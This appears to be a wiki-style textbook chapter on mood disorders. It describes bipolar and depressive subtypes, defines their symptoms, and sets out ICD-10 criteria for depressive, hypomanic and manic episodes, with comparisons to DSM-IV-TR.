Dysthymic and cyclothymic disorders are recognized by contemporary classification systems as separate diagnostic entities and often do not lead to the manifestation of a full blown mood episode. Dysthymic disorder corresponds largely to a chronic mild form of depression with a relatively stable social functioning. 
      
Bipolar disorders (previously called manic-depressive psychosis) consists of at least one hypomanic, manic, or mixed episode. Mixed episodes represent a simultaneous mixture of depressive and manic or hypomanic manifestations. Although a minority of patients experience only manic episodes, most bipolar disorder (BD) patients experience episodes of both polarity. 
      
The classical definition of BD suggests that this disorder is characterized by the presence and alteration of manic and depressive episodes with a return to premorbid level of functioning between the episodes and a favorable outcome in comparison to schizophrenia (Kraepelin, 1921). Today we know that this is not always the case (Tohen, Waternaux, &amp; Tsuang, 1990). The Kraepelinian concept largely corresponds to BD type I (BD-I) according to DSM-IV-TR (American Psychiatric Association, 2000). Typically, BD-I starts before the age of 40. Frequently the correct diagnosis is made after several years because the first episode is psychotic-like or depressive and the diagnosis is only evident after a manic or mixed episode emerges. Another type, BD-II is officially recognized as a bipolar illness subtype and it is characterized by the presence of hypomanic instead of manic episodes. However, it is important to note that according to DSM-IV-TR (American Psychiatric Association, 2000) hypomania is defined mainly in terms of a shorter duration of the episode. BD-II is more prevalent than BD-I disorder. An additional complicating factor for diagnosis is that patients usually experience hypomania as a recovery from depression and almost always as a pleasant ego-syntonic mood state. 
      
Depressive episodes are considered to be the second diagnostic pillar of BD. However, in contrast to manic episodes which lead to the diagnosis of BD immediately, depressive episodes pose a dilemma to the clinician regarding whether or not he or she faces a unipolar depression or a BD. This is an important dilemma to solve since the treatment of these disorders differ. However, it has been estimated that more than half of patients originally manifesting a depressive episode will turn out to have BD in the next 20 years (Angst, Sellaro, Stassen, &amp; Gamma, 2005). Unipolar-depressed patients who later &quot;convert&quot; to BD over time, as well as patients with bipolar depression manifest more frequently &quot;atypical&quot; features of depression (hypersomnia, hyperphagia, leaden paralysis, long term interpersonal rejection sensitivity, psychomotor retardation, psychotic features, pathological guilt and mood lability)(Perugi et al. 1998). BD patients also tend to have earlier age of onset, more prior episodes of depression, shorter depressive episodes, and family history of BD (Akiskal &amp; Benazzi, 2008; Mitchell, Goodwin, Johnson, &amp; Hirschfeld, 2008). Family history of BD is a strong predictor of bipolarity even in children and adolescents (Geller, Fox, &amp; Clark, 1994). DSM-IV-TR recognizes atypical features of depression (Davidson, Miller, Turnbull, &amp; Sullivan, 1982; Fountoulakis, Iacovides, Nimatoudis, Kaprinis, &amp; Ierodiakonou, 1999; Thase, 2007). This depressive subtype includes the presence of personality-like features such as long-term interpersonal rejection sensitivity, and somatic symptoms such as reverse vegetative signs, hypersomnia, increased appetite, weight gain and leaden paralysis. There is strong evidence linking atypical depression to BD-II (Akiskal &amp; Benazzi, 2005).
      
Mixed episodes are also considered to be part of the BD picture, and according to DSM-IV-TR are defined as the co-existence of both depressive and manic symptoms to the extent that the criteria for both a manic and a depressed episode are fulfilled (Akiskal &amp; Benazzi, 2004). Alterations in mood characterize several other DSM disorders which have a bipolar character. These include cyclothymic disorder and borderline personality disorder. However, there is a constellation of types of affective episodes which are not part of the official classification and they are so prevalent in real life clinical practice that many authors consider them to be the rule rather than the exception.
      
Sometimes there is a mixture of manic and depressive symptoms in a combination which does not fulfill the specific DSM criteria for a manic, depressive or mixed episode. Therefore, the only possible diagnosis is that of a Not-Otherwise-Specified (NOS) mood episode (Akiskal, 1996; Akiskal et al. 1998). 
      
Often manic symptoms can go unnoticed by the clinician because instead of being hyperthymic, the mood is irritable and is diluted in the presence of depressed thought content and suicidal ideation. Such a presentation may lead the clinician to the diagnosis of anxious or agitated depression, or worse, of a personality disorder, instead of a mixed or mixed-NOS mood episode. Frequently, this irritable mood can result in aggressive behavior especially if confronted or rejected while having grandiose or paranoid delusions. These patients may be the most aggressive seen in the emergency room (Maj, Pirozzi, Magliano, &amp; Bartoli, 2003; Sato, Bottlender, Kleindienst, &amp; Moller, 2005). 
      
There is evidence that an excited/irritable state can develop when antidepressants, especially dual action ones, are used. Many patients will not develop a classic manic episode in response; many will either develop a full blown mixed episode or more likely a DSM sub-threshold mixed-NOS episode with the presence of a small number of manic symptoms in combination with depression, especially agitation, and this state may persist and worsen if more aggressive antidepressant treatment is tried.  
      
Rapid cycling refers to patients suffering from at least 4 mood episodes in a year. It seems that females are more often rapid-cyclers as well as higher social class subjects. In essence, these patients tend to be symptomatic most of their life and are considered to be refractory to lithium. The diagnosis may elude for prolonged periods of time and the patients can receive the diagnosis of a personality disorder or cyclothymia. Treatment of rapid cycling is based on a complex, delicate and difficult to design multiple pharmacotherapy which includes atypical antipsychotics, anticonvulsants and even antidepressants, although the latter are believed to induce rapid cycling (Bauer et al. 1994).  
      
Psychotic features are common in bipolar patients and may include delusions or hallucinations of any type. They can either be mood congruent or mood incongruent. In order to make the diagnosis of schizoaffective disorder according to DSM-IV-TR there must be a psychotic episode in the absence of prominent mood symptoms. However, according to ICD-10 this diagnostic boundary is vague and differential classification is often difficult.  
      
Alcohol and substance abuse are very common problems in BD. Drug abuse may precipitate an earlier onset of BD-I in those who already have a familial predisposition for mania. Alcohol abuse may be present in more than half of patients. It seems that frequently this represents self-medication efforts and abuse is particularly problematic during adolescence and early adulthood.  At this age period substance and alcohol abuse may not only suppress symptoms but also enhance specific desired activities (e.g., high school performance, sex etc.). Alcohol abuse can cause further disinhibition and may cause the patient to manifest physical aggression especially towards the family, with &quot;crimes of passion&quot; being the most tragic result. BD patients tend to abuse stimulant drugs. Familial diathesis for mania is significantly associated with the abuse of alcohol and drugs and it is possible that there is a common familial-genetic diathesis for a subtype of BD-I, alcohol and stimulant abuse (Winokur et al.1998).
      
The cognitive deficits of BD patients have not been studied adequately. However, in contrast to the early Kraepelinian concept for a favorable functioning outcome, recent studies suggest there is a significant degree of psychosocial impairment even when patients are euthymic and report that only a minority achieves complete functional recovery (Daban et al. 2006; Goldberg, Harrow, &amp; Grossman, 1995a, 1995b; Keck et al. 1998; Martinez-Aran et al. 2007; Mur, Portella, Martinez-Aran, Pifarre, &amp; Vieta, 2007; Strakowski et al. 1998). Cognitive impairment is reported to exist in both BD-I and BD-II patients, although more so in the BD-I group and this is true even during the euthymic period. The cognitive deficit can be worse during the manic phase but it is present during all phases of the illness (Dixon, Kravariti, Frith, Murray, &amp; McGuire, 2004; Malhi, Ivanovski, Szekeres, &amp; Olley, 2004). However, when compared to patients with schizophrenia, BD patients demonstrate a lesser degree of deficits, particularly concerning premorbid and current intelligence quotient and perhaps attention, verbal memory,verbal fluency and executive functions (Mur et al. 2007; Torrent et al. 2006). The pattern of the neurocognitive deficit implicates the prefrontal cortex and temporo-limbic structures, especially ventromedial areas as well as the amygdala and the hippocampus. 
      
Mood disorders are characterized by a constellation of symptoms and signs. The terms &quot;depressed mood,&quot; &quot;anhedonia&quot; and &quot;elevated mood&quot; are central to the definition and diagnosis of these disorders. 

'''Mood'''

*'''Euthymia''' refers to the normal range of mood, and the absence of any disorder.

*'''Mourning''' refers to the experience of sadness as a consequence of a loss of a loved one. It includes, crying, sadness, preoccupation with the lost person and related memories. 

*'''Depressed mood''' means that the patient experiences a &quot;negative&quot; and unpleasant affect, and in English and other western cultures and languages the words (or their linguistic equivalents) &quot;depressed,&quot; &quot;anguished,&quot; &quot;mournful,&quot; &quot;sad,&quot; &quot;anxious,&quot; &quot;blues&quot; are used. The word &quot;depressed&quot; is increasingly used because of the higher information (partially because of the internet) the public has today on depression. The way patient uses describes this experience depends on his/her cultural and educational background, and can focus on bodily function or on existential and interpersonal dysphoria and difficulties. Somatic complaints are more prominent in milder cases usually seen in the primary care setting, particularly in patients with anxious depression. These patients were considered to suffer from &quot;masked&quot; depression.

*'''Anhedonia''' refers to the inability to experience normal emotions. Frequently, patients with anhedonia are incapable of even feeling the depressed affect and they can’t even cry. The patient abandons activities which in the past were a source of joy and gives up interest in life. Patients with more severe depression are indifferent even concerning their children or spouse and isolate themselves. The difference from the flat (blunted) affect seen in schizophrenia is that anhedonia is itself painful. As depression starts remitting, anhedonia is one of the first symptoms to remit.

*'''Elevated mood''' refers to a state of elation, overconfidence, and enjoyment, with the person being cheerful, laughing and making happy and expressive gestures. It is not always pathological. 

*'''Euphoria''' refers to a pathologically too much elevated mood that is inappropriate to real events. It is considered to constitute the opposite pole of &quot;depressed mood&quot; with &quot;normality&quot; in the middle. Experiencing a euphoric mood is pleasant thus patients are reluctant to receive treatment.   

*'''Expansive mood''' is a condition with the patient expressing his/her feelings without restraint and control and behavior is usually colored by grandiose thoughts. 

*'''Emotional lability''' refers to unstable and rapidly changing emotions because of hyper-reactivity to environmental stimuli. It is not always pathological

*'''Irritable mood''' is a state in which the person is easily annoyed by external stimuli and expresses anger and hostility at a low threshold. The presence of an irritable mood is often the cause for misdiagnosis of the patient, especially in combination with lability and mixed states.

'''Psychomotor Disorder'''

*'''Flight of ideas''' refers to an acceleration of the thinking processes, and it manifests itself in the form of rapid speech. Speech can be coherent and thoughts unusually sharp. However, when speed is excessively high, they both become incoherent and fragmented with content changing abruptly. Associations can be based on rhyme or chance perceptions. 

*'''Psychomotor acceleration''' is considered to be the hallmark of mania, characterized by excessive activity (which is goal directed, high energy and endurance) as well as rapid, pressured speech.

*In comparison, '''psychomotor agitation''' also refers to a both mental and physical overactivity (pressured speech, restlessness, increased motor behavior) usually accompanied by a feeling of an inner turmoil or severe anxiety, with the intensity being so great that in spite of the fact that the patient has normal arousal, most if not all of this activity is purposeless.  

*'''Psychomotor slowing''' means that the patient is inert and slow, both physically and mentally, but this does not always have an effect on overall performance although everything is done with much effort

* When psychomotor slowing is excessive, then '''psychomotor retardation''' appears and it includes reduction or disappearance of spontaneous motor activity, slumped posture and gaze, reduced and slow speech, and great fatigue. 

*'''Stupor''' appears in younger patients when the psychomotor retardation is so extreme that they are unable to perform even basic everyday tasks. In more severe cases, motoric immobility occurs.     

*'''Catatonia''' is defined as a complex condition which can include diverse symptoms and signs such as motoric immobility or on the contrary excessive purposeless motor activity not influenced by external stimuli, motiveless negativism, mutism, peculiar or stereotyped movements, mannerisms, grimacing and sometimes echolalia or echopraxia. 

*'''Fatigue''' is a common problem in all mental disorders but especially in mood disorders and includes feeling tired or weak, sleepy, and sometimes irritable.

'''Neurocognitive Disorder'''

The term &quot;neurocognitive&quot; is often used with reference to higher cognitive function, such as attention, concentration, memory, praxis etc., and in psychiatry in contrast to the term &quot;cognitive&quot; which often is used with reference to the thought content or style and relates to cognitive therapy.  Bipolar patients constitute a clinically heterogeneous group. However, they seem to perform poorly on most neuropsychological tests in comparison to healthy controls. They seem to suffer from deficits especially related to attention, inhibitory control, spatial working memory, semantic verbal fluency, verbal learning and memory, and maybe executive function (especially when considering the more severe and psychotic end of the bipolar spectrum). Verbal memory and probably executive function impairments may represent a trait rather than a state marker (Martinez-Aran et al. 2007; Martinez-Aran et al. 2008).

In extreme cases, neurocognitive disorder is so severe, especially in elderly patients that the picture resembles that of a dementing disease, thus is called &quot;pseudodementia.&quot; However, it seems that at least half of these patients do in fact suffer from a dementing process at its early stages and later they manifest a formal dementia syndrome (Alexopoulos, Meyers, Young, Mattis, &amp; Kakuma, 1993; Alexopoulos, Young, &amp; Meyers, 1993; Bajulaiye &amp; Alexopoulos, 1994; Reifler, 2000; Saez-Fonseca, Lee, &amp; Walker, 2007)   If one looks at the problem from another point of view, depression with mild cognitive disorder may be either the first manifestation or a risk factor for the development of dementia, especially when combined with a family history of dementia (Tsolaki, Fountoulakis, Chantzi, &amp; Kazis, 1997; VanOjen &amp; Hooijer, 1995; VanOjen, Hooijer, &amp; . , 1995).

'''Thought Disorder'''

*'''Depressive thought content:''' depressed patients are characterized by a negative evaluation of the self, the world, and the future (the negative cognitive triad). In this frame, the depressive thought content includes pessimism, low self-esteem and low self-confidence, ideas of loss, deprivation and guilt, helplessness and hopelessness, and ultimately thoughts of death and suicide. The extent to which this negative way of thinking is primary or secondary is a matter for debate. 

*'''Clang association:''' refers to the condition when the patient’s thoughts association and subsequently the speech are directed by the sound of a word rather than by its meaning. Therefore, words are not connected in a logical way and punning and rhyming serve as the drive.

*'''Thoughts of guilt''' concern self-reproach, self accussation and feeling the need for punishment. Thoughts and feelings of guilt are to largely normal and they can appear during a mood disorder because of the disability the disorder causes and the inability of the patient to fulfill his/her obligations towards significant others. In this frame patients may also feel shame. However, when the intensity and the content is excessive or even inappropriate then thoughts of guilt should be considered to be part of the symptoms and in more severe cases these thoughts may take on a delusional character. 

*'''Thoughts of death''' are particularly important because they may eventually lead to suicidal behavior. The common belief that inquiring about such thoughts provokes suicidal behavior has no scientific basis. On the contrary, patients are often relieved this way. These thoughts include thoughts that the person will die and often the wish to die in some way so as to leave the suffering behind; this way they lead to suicidal ideation.

*'''Suicidal ideation''' refers to specific thoughts of killing oneself. It has many different forms, ranging from indirect expression (e.g., a wish not to wake up, or to die from a disease or an accident), to suicidal obsessions (urges or impulses to destroy oneself) and finally to elaborate planning of suicide. Some patients behave in a passive self-destructing way (e.g., careless driving or walking) while others plan their death in detail leaving notes and making sure no help will come on time.

*'''Manic thinking''' is excessively positive and optimistic. It is characterized by inflated self-esteem, grandiose sense (concerning importance, power, knowledge, or identity), over-confidence and sense of high achievements and abilities. Manic patients are refractory to explanations, confrontation, and to a significant extent they lack self-examination and insight; because of this lack of insight, mania nearly always, sooner or later acquires a delusional character.

'''Psychotic Symptoms'''

Psychotic features include delusions and hallucinations and both can be mood congruent or non-congruent depending on their content. Mood congruent psychotic features include those entirely consistent with the thought content (either manic or depressive) while mood incongruent are largely unrelated to it. Psychotic features are not uncommon in mood disorders, especially in bipolar disorder and delusions are relatively more common than hallucinations. 

*'''Mood-congruent depressive delusions:''' often depressed thoughts can acquire a delusional severity and delusions congruent with depressive mood appear. Their content concerns inappropriate or over-exaggerated thoughts of guilt, sin, worthlessness, poverty and somatic health. Delusions concerning persecution and jealousy, although seemingly non-congruent, can also be mood congruent if they can be explained by, or strongly related to, thoughts of sin, guilt, jealousy or worthlessness.  This kind of delusional thought makes a parent kill his/her family so as to save them from moral or physical corruption and then he/she commits suicide. 

*'''Nihilistic delusions''' (Cotard delusion or Cotard's syndrome, negation delusion are related to depressive mood and  concern the delusional belief that all or parts of the patient’s body are missing or rotten or decomposing, their internal organs are rotten or solidifying or are actually dead; the world and everything related to it have ceased to exist. 

*'''Mood-congruent manic delusions:''' during manic episodes usually the thought content becomes delusional and includes delusions of exceptional mental and physical fitness or special talents. It may also include delusions of wealth, some kind of grandiose identity or importance. Sometimes the delusion can be so excessive that the identity itself changes (e.g., the patient believes that he is the incarnation of a messiah or a prophet etc.) Delusions of reference and persecution are considered to be mood-congruent on the basis of the belief that jealousy of the others at their special abilities is the cause of problems. 

*'''Mood-incongruent delusions:''' various delusional ideas seemingly non-congruent (e.g., ideas of persecution or reference) can eventually be understood as arising from the grandiose sense of self and the belief of the patient that this importance causes the others to envy. However, sometimes there are delusions with no association to current mood (e.g., bizarre delusions without contextual relationship to mood). Sometimes a mixed mood episode can manifest itself with mood-incongruent delusions e.g., grandiose delusions in the presence of depressed mood.

*'''Depressive mood-congruent hallucinations''' are hallucinations consistent with either a depressed (e.g., voices accusing or humiliating) or manic mood (e.g., voices praising). Depressive mood-congruent hallucinations have an unpleasant content and they cause significant additional distress to the patient. Sometimes they command the patient to commit suicide and even dictate the method.

*'''Manic mood-congruent hallucinations:''' sometimes a manic mood causes such a vivid internal experience that the patient feels he/she can hear or see his/her own thoughts (e.g., hear hymns or live in the paradise).

*'''Mood-incongruent hallucinations''' refer to hallucinations unrelated to the current mood state.

*'''Insight:''' classically, depressive episodes are characterized by a fair degree of insight with the exception of the more severe psychotic cases. On the contrary, manic episodes are routinely characterized by a significant lack of insight and thus clinicians must routinely obtain basic information from significant others. This lack of insight may lead to refusal of treatment and to the need for involuntary admission to hospital.

'''Somatic and Neurovegetative Symptoms'''

Depressed patients often manifest changes in appetite, sleep and sexual functioning. Circadian rhythms are also disrupted. The classical notion of depression which is closer to melancholia includes reduction in all these functions; however, recently the &quot;atypical&quot; form of depression was described and this form includes an increase in these neurovegetative functions; that is overeating and oversleeping along with interpersonal rejection sensitivity which is a &quot;personality-like&quot; feature. 

*'''Anorexia and weight loss:''' are considered to be reliable signs of depression. They can both be considered in the frame of a generalized inability to enjoy things (anhedonia). Weight loss is seen sometimes in paranoid patients who are afraid that food is poisoned and this should not be confused with anorexia and weight loss in the frame of depression. Weight loss is also frequent in cases of malignant disease so a full medical investigation should accompany any patient with changes in appetite or weight. 

*'''Weight gain''' has been, relatively recently, recognized as a depressive feature and could be the result of overeating, decreased activity, or both. Apart from its devastating effect on the self-confidence and self-image, it can worsen the general somatic health especially in patients that become obese and suffer from metabolic syndrome.

*'''Insomnia''' is one of the hallmarks of depression and one of its most disturbing features. There are many types of insomnia that is, difficulty falling asleep (initial insomnia), multiple awakenings during the night (middle insomnia) or early morning awakening (terminal insomnia). Insomnia prolongs the depressive agony round the clock. Some patients try to self-medicate and solve the problem by alcohol or drug abuse (sedatives or hypnotics) but both eventually worsen the problem, partially because of tolerance and dependence problems and partially because they both further destroy the architecture of sleep. Unipolar depressed patients tend to exhibit insomnia stereotypically episode after episode and characteristically, in spite of extreme fatigue, they rarely oversleep.  

*'''Hyposomnia:''' the term suggests a decreased need for sleep. That is, the patient feels energetic on awakening even though he slept for short periods. Some patients feel fresh and energetic even though he/she haven’t slept for days. This condition is usually seen during manic episodes and sometimes it heralds the beginning of such an episode. 

*'''Hypersomnia:''' some patients, especially younger ones and females, often sleep too much and find it difficult to get up from the bed in the morning. Along with the other atypical features it is considered to be a marker for an underlying bipolar illness even in cases where no other bipolar feature is present. This condition should be differentially diagnosed from a number of medical conditions including narcolepsy and the Klein-Levin syndrome. In spite of prolonged sleep, depressed patients are characteristically tired in the morning, meaning that even prolonged sleep is not refreshing for them. The change in the pattern of sleep disruption with insomnia alternating with hypersomnia or hyposomnia suggests the presence of a bipolar illness rather than a unipolar depression. 

*'''Circadian dysregulation:''' although many circadian functions can be disrupted in depressed patients, mainly the disturbance of sleep rhythms has been adequately studied. This disturbance includes deficits in delta sleep and more intense rapid eye movement (REM) activity during the first third of the night. A marked shortening of REM latency (that is the time from the onset of sleep to the first REM period) is considered to be characteristic for depression of any type, and seen even in remitted depressive patients and their healthy relatives. 

*'''Seasonality:''' seasonal (especially autumn-winter) emergence or worsening of depression has been recognized since antiquity and mood has been related to the period of the year. Most patients seem to experience increased energy and activation during spring and the opposite during the fall and winter. Usually patients with strong seasonality also have reverse neurovegetative symptoms (fatigue, crave sugars, overeat and oversleep). In some patients seasonality is so concrete and important that modern classification includes a seasonal pattern for mood disorders.

*'''Sexual dysfunction:''' depressed patients classically report a decreased sexual desire and activity while additionally some women manifest a temporary interruption of their menses. Sexual dysfunction especially in females can lead to marital conflict and a psychodynamic/psychotherapeutically oriented therapist can mistakenly ascribe depression to the marital conflict with profound negative effects on the therapeutic outcome. Treating the sexual dysfunction or its consequences and leaving depression untreated is not uncommon and includes even surgical or unusual therapeutic interventions. An additional problem is that treatment with antidepressants often has sexual dysfunction as an adverse effect. The recent emergence of agents that treat impotence (e.g., sildenafil, tadalafil) could add a new method to treat this problematic symptom but this should never move the focus of treatment away from depression.    

*'''Increased sexual desire and activity''' is typical for manic episodes, but also a subgroup of depressed patients may manifest increased sexual drive or activity and usually they also manifest other atypical or &quot;reversed&quot; features. Therefore, if seen in the frame of depression it heralds the presence of a depressive mixed episode.  The increased sexual appetite usually leads to sexual indiscretion accompanied by a risky sexual life, often leading to marital problems, multiple separations or divorces, alcohol and drug abuse, gambling and sexually transmitted diseases like AIDS.

'''Behavioral Disorder'''

*'''Logorrhea''' refers to pressured, excessive and not always coherent speech, which is often uncontrollable. It is observed during manic episodes. Speech can be completely incomprehensible, with destroyed syntax and loose associations, often posing diagnostic dilemmas (e.g., from stroke). Other similar terms used are tachylogia, verbomania, volubility.

*'''Impulsive behavior:''' during mood episodes, either manic, depressive or mixed, patients tend to exhibit impulsive behavior. Especially during manic episodes they tend to be impulsive, disinhibited, and meddlesome. They are intrusive with increased involvement with others, poor social judgment and engage in a variety of activities without control or restraint (including aggression, sex, gambling, drug and alcohol abuse, spending, making gifts, risk taking, travelling etc.) Impulsive behavior is symptom that causes most problems and especially financial and interpersonal. In some cases even suicide may be acted on an impulsive basis.

The terms &quot;endogenous depression,&quot; &quot;neurotic depression,&quot; &quot;anxious depression,&quot; &quot;involutional melancholia,&quot; &quot;psychotic depressive reaction&quot; are not included in modern classification systems for a variety of reasons. The term &quot;neurasthenia&quot; is maintained in ICD-10 but its meaning is vague. 

It seems that the psychotic melancholic subtype is the most stable type of depression repeating itself across episodes (Coryell et al. 1994). Almost a third of all major depressive episodes do not recur and it seems that recurrent depression is more familial with on average 6 months episode duration and a varying inter-episode interval length. A significant proportion of patients remain symptomatic and disabled, many of them suffering from subsyndromal depression (Judd et al. 1998). Around 15% develops psychotic features 

'''Comorbidity'''

Large epidemiological studies and clinical experience suggest that mood disorders either co-exist or overlap considerably with anxiety disorders. Anxiety disorders can occur during a depressive episode, may be a precursor to it, or may appear during the future course of a mood disorder. Several authors suggest there is a common diathesis connecting mood and anxiety disorders with more recent data suggesting a strong link between BD-II and panic, obsessive-compulsive disorder, and social phobia. 
      
All mood disorders but especially bipolar disorder are highly likely be comorbid with alcohol and drug (mainly stimulants) abuse, usually in the frame of a self-treatment effort from the side of the patient (Winokur et al. 1998). 
      
Somatic illness frequently co-exists with depression and anxiety and the mood disorder has a profound negative impact on the outcome of the somatic illness. The therapist should also suspect clinical depression in all patients who refuse to participate in medical care.

==== Classification ====

The International Classification of Diseases, 10th version (ICD-10) includes sets of criteria for mood disorders, which are used throughout the world and constitute the official method of reporting health statistics. They are overlapping with the Diagnostic and Statistical Manual of Mental Disorders 4th edition, Text Revision (DSM-IV-TR) criteria; however, important differences do exist.

The basis of the classification in both systems is the definition of the depressive and manic/hypomanic episodes. The two systems describe mood disorders as follows:

In the ICD-10 the depressive episode is defined as follows: 

'''A. DEPRESSIVE EPISODE''' 
 
'''General criteria for a depressive episode:'''

G1. The depressive episode should last for at least 2 weeks.

G2. There have been no hypomanic or manic symptoms sufficient to meet the criteria for hypomanic or manic episode (F30._) at any time in the individual's life.

G3. Most commonly used exclusion clause. The episode is not attributable to psychoactive substance use (F10-F19) or to any organic mental disorder (in the sense of F00-F09).

F32: '''Depressive episode'''

A. The general criteria for depressive episode (F32) must be met.

B. At least two of the following three symptoms must be present:

(1) depressed mood to a degree that is definitely abnormal for the individual, present for most of the day and almost every day, largely uninfluenced by circumstances, and sustained for at least 2 weeks;

(2) loss of interest or pleasure in activities that are normally pleasurable;

(3) decreased energy or increased fatigability.

C. An additional symptom or symptoms from the following list should be present, to give a total of at least: four for '''mild''' (F32.0), six for '''moderate''' (F32.1) and eight for '''severe''' (F32.2 or F32.3 - depending on psychotic symptoms)depressive episode:

(1) loss of confidence or self-esteem;

(2) unreasonable feelings of self-reproach or excessive and inappropriate guilt;

(3) recurrent thoughts of death or suicide, or any suicidal behavior;

(4) complaints or evidence of diminished ability to think or concentrate, such as indecisiveness or vacillation;

(5) change in psychomotor activity, with agitation or retardation (either subjective or objective);

(6) sleep disturbance of any type;

(7) change in appetite (decrease or increase) with corresponding weight change.

A fifth character may be used to specify the presence or absence of the &quot;somatic syndrome&quot;:

F32.x0 Without somatic syndrome 

F32.x1 With somatic syndrome 

F32.2: Without psychotic symptoms (only for severe depressive episode) 

F32.3: With psychotic symptoms (only for severe depressive episode) 

F32.3: '''Severe depressive episode with psychotic symptoms'''

A. The general criteria for depressive episode (F32) must be met.

B. The criteria for severe depressive episode without psychotic symptoms (F32.2) must be met with the exception of criterion D.

C. The criteria for schizophrenia (F20.0-F20.3) or schizoaffective disorder, depressive type (F25.1), are not met.

D. Either of the following must be present:

(1) delusions or hallucinations, other than those listed as typically schizophrenic in criterion G1(1)b, c, and d for general criteria for F20.0-F20.3 (i.e., delusions other than those that are completely impossible or culturally inappropriate and hallucinations that are not in the third person or giving a running commentary); the commonest examples are those with depressive, guilty, hypochondriacal, nihilistic, self-referential, or persecutory content;

(2) depressive stupor.

A fifth character may be used to specify whether the psychotic symptoms are congruent or incongruent with mood:

F32.30: '''With mood-congruent psychotic symptoms''' (i.e., delusions of guilt, worthlessness, bodily disease, or impending disaster, derisive or condemnatory auditory hallucinations)

F32.31: '''With mood-incongruent psychotic symptoms''' (i.e., persecutory or self-referential delusions and hallucinations without an affective content)

F32.8: '''Other depressive episodes:''' Episodes should be included here which do not fit the descriptions given for depressive episodes, but for which the overall diagnostic impression indicates that they are depressive in nature. Examples included fluctuating mixtures of depressive symptoms (particularly those of the somatic syndrome) with nondiagnostic symptoms such as tension, worry, and distress, and mixtures of somatic depressive symptoms with persistent pain or fatigue not due to organic causes (as sometimes seen in general hospital services).

F32.9: '''Depressive episode, unspecified'''

'''Somatic syndrome'''

Some depressive symptoms are widely regarded as having special clinical significance and are here called &quot;somatic&quot; (terms such as biological, vital, melancholic, or endogenomorphic are used for this syndrome in other classifications).
A fifth character may be used to specify the presence or absence of the somatic syndrome. To qualify for the somatic syndrome, four of the following symptoms should be present:

(1) marked loss of interest or pleasure in activities that are normally pleasurable;

(2) lack of emotional reactions to events or activities that normally produce an emotional response;

(3) waking in the morning 2 hours or more before the usual time;

(4) depression worse in the morning;

(5) objective evidence of marked psychomotor retardation or agitation (remarked on or reported by other people);
(6) marked loss of appetite;

(7) weight loss (5% or more of body weight in the past month);

(8) marked loss of libido.

In The ICD-10 Classification of Mental and Behavioural Disorders: Clinical descriptions and diagnostic guidelines, the presence or absence of the somatic syndrome is not specified for severe depressive episode, since it is presumed to be present in most cases. For research purposes, however, it may be advisable to allow for the coding of the absence of the somatic syndrome in severe depressive episode.

The DSM-IV-TR definition of the depressive episode is similar in essence to the ICD-10 definition; however there are some differences. The time duration of 2 weeks is the same, but the first set of criteria to be met (the equivalent of criterion B) includes only the first two, that is depressed mood and loss of pleasure and not decreased energy, and demands either of them to be present in contrast to ICD which demands two out of three. The list of depressive symptoms of DSM-IV-TR does not include &quot;loss of confidence or self esteem&quot; and demands five out of a total of nine to be present. There is a definition for &quot;mild&quot; (up to 6 symptoms) but the definition of &quot;moderate&quot; and &quot;severe&quot; episodes are based rather on global disability. Most criteria include a more explicit time and intensity description, e.g., &quot;nearly every day.&quot; ICD-10 demands symptoms do not fulfill the diagnosis of a manic/hypomanic episode while DSM-IV-TR demands the same for a mixed episode, but in essence it is the exactly the same. DSM-IV-TR includes the need of a functional impairment and that symptoms are not better accounted by bereavement.
Both systems accept the possibility of the presence of mood congruent or incongruent psychotic symptoms; however while the ICD-10 implies that specific psychotic symptoms are more or less pathognomonic of a schizophrenia-like psychosis (like hallucinations giving a running commentary), the DSM-IV-TR accepts all kind of psychotic experiences in the frame of a mood episode. This creates a profound difference in the way the two systems define the boundary between psychotic mood disorder and schizoaffective disorder, and define the latter in a very different way.
Another important difference between the two systems is that the ICD-10 defines the &quot;somatic syndrome&quot; while the DSM-IV-TR the &quot;melancholic features.&quot; Both definitions are an attempt to include an &quot;endogenous/melancholic-like&quot; subgroup in the classification. It seems that the DSM-IV-TR definition is closer to this, while the ICD-10 definition includes too many anxiety and non-specific symptoms. Also the DSM-IV-TR includes the &quot;atypical features&quot; on the basis of mood reactivity, interpersonal rejection sensitivity and reversed neurovegatative symptoms. It seems that the DSM approach has higher reliability (Fountoulakis et al. 1999). Also catatonic features and postpartum onset are distinct specifiers for DSM.    

'''B. MANIC  EPISODE'''

F30.0: '''Hypomania'''

A. The mood is elevated or irritable to a degree that is definitely abnormal for the individual concerned and sustained for at least 4 consecutive days.

B. At least three of the following signs must be present, leading to some interference with personal functioning in daily living:

(1) increased activity or physical restlessness;

(2) increased talkativeness;

(3) distractibility or difficulty in concentration;

(4) decreased need for sleep;

(5) increased sexual energy;

(6) mild overspending, or other types of reckless or irresponsible behavior;

(7) increased sociability or overfamiliarity.

C. The episode does not meet the criteria for mania (F30.1 and F30.2), bipolar affective disorder (F31._), depressive episode (F32._), cyclothymia (F34.0), or anorexia nervosa (F50.0).

D. Most commonly used exclusion clause. The episode is not attributable to psychoactive substance use (F10-F19) or to any organic mental disorder (in the sense of F00-F09).

F30.1: '''Mania without psychotic symptoms'''

A. Mood must be predominantly elevated, expansive, or irritable, and definitely abnormal for the individual concerned. The mood change must be prominent and sustained for at least 1 week (unless it is severe enough to require hospital admission).

B. At least three of the following signs must be present (four if the mood is merely irritable), leading to severe interference with personal functioning in daily living:

(1) increased activity or physical restlessness;

(2) increased talkativeness (&quot;pressure of speech&quot;);

(3) flight of ideas or the subjective experience of thoughts racing;

(4) loss of normal social inhibitions, resulting in behavior that is inappropriate to the circumstances;

(5) decreased need for sleep;

(6) inflated self-esteem or grandiosity;

(7) distractibility or constant changes in activity or plans;

(8) behavior that is foolhardy or reckless and whose risks the individual does not recognize, e.g., spending sprees, foolish enterprises, reckless driving;

(9) marked sexual energy or sexual indiscretions.

C. There are no hallucinations or delusions, although perceptual disorders may occur (e.g., subjective hyperacusis, appreciation of colors as especially vivid).

D. Most commonly used exclusion clause. The episode is not attributable to psychoactive substance use (F10-F19) or to any organic mental disorder (in the sense of F00-F09).

F30.2: '''Mania with psychotic symptoms'''

A. The episode meets the criteria for mania without psychotic symptoms with the exception of criterion C.

B. The episode does not simultaneously meet the criteria for schizophrenia (F20.0-F20.3) or schizoaffective disorder, manic type (F25.0).

C. Delusions or hallucinations are present, other than those listed as typically schizophrenic in criterion G1(1)b, c and d for F20.0-F20.3 (i.e., delusions other than those that are completely impossible or culturally inappropriate, and hallucinations that are not in the third person or giving a running commentary). The commonest examples are those with grandiose, self-referential, erotic, or persecutory content.

